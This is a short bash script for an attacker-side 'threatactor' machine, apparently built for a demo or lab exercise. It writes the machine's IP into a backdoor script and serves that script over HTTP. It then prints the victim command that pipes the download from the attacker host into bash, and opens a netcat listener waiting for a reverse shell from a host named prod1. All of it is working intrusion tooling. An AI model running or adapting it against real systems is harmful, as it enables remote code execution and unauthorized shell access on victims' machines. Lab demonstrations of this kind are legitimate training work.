#!/bin/bash
# Run this on the threatactor VM before the demo.
# It patches backdoor.sh with this machine's IP, starts an HTTP server to serve it,
# then opens a netcat listener waiting for the reverse shell from prod1.

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PORT_HTTP=8000
PORT_SHELL=4444

ATTACKER_IP=$(hostname -I | awk '{print $1}')
echo "[*] Threatactor IP: $ATTACKER_IP"

# Patch the placeholder in backdoor.sh
sed -i "s/__THREATACTOR_IP__/$ATTACKER_IP/g" "$SCRIPT_DIR/backdoor.sh"
echo "[*] backdoor.sh patched with $ATTACKER_IP"

# Serve backdoor.sh over HTTP
echo "[*] Starting HTTP server on :$PORT_HTTP"
python3 -m http.server $PORT_HTTP --directory "$SCRIPT_DIR" &
HTTP_PID=$!
echo "    PID $HTTP_PID — victim runs: curl http://$ATTACKER_IP:$PORT_HTTP/backdoor.sh | bash"
echo ""

# Block waiting for reverse shell
echo "[*] Listening for reverse shell on :$PORT_SHELL ..."
nc -lvnp $PORT_SHELL

# Clean up HTTP server when nc exits
kill $HTTP_PID 2>/dev/null
echo "[*] Done."
